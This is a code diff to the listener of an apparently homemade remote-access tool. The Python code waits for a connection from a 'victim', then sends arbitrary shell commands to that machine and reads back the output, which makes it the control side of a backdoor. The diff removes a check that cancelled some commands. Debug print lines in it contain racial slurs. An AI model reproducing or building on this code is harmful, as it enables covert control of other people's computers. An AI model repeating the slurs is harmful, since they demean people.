@@ -2,7 +2,7 @@ import socket
 
 conEST = False
 
-def listen(ip: str, port: int, connectionLimit, q, listenermessage, conQ):
+def listen(ip: str, port: int, connectionLimit, q, listenermessage, conQ, osQ):
     try:
         global conEST
         listenermessage.put(f'Listener started on {ip}:{port}')
@@ -16,6 +16,10 @@ def listen(ip: str, port: int, connectionLimit, q, listenermessage, conQ):
         victim, victim_address = server.accept()
         conEST = True
         conQ.put(True)
+        victim.settimeout(1)
+        #os = victim.recv(100000).decode()
+
+        #osQ.put(os)
 
         q.put((victim, victim_address))
     except Exception as e:
@@ -34,20 +38,15 @@ def sendCommand(command: str, q, commandQ, errorQ):
             if len(command) < 1:
                 customOutput = "Command cannot be null"
                 command = 'cd'
-            if command == 'say' or command == 'python':
-                customOutput = 'Command cancelled because the written command breaks connection.'
-                command = 'cd'
-
             print("shitting nigger")
             victim.send(command.encode())
             print("nigger")
-            victim.settimeout(5.0)
             output = victim.recv(1000000000).decode()
             commandQ.put(output)
             errorQ.put(customOutput)
         else:
             customOutput = 'Command cannot be sent because there is no active connection with victim.'
-            commandQ.put((customOutput))
+            commandQ.put(customOutput)
     except Exception as ex:
         if type(ex) == AttributeError:
             print("No victim is connected")
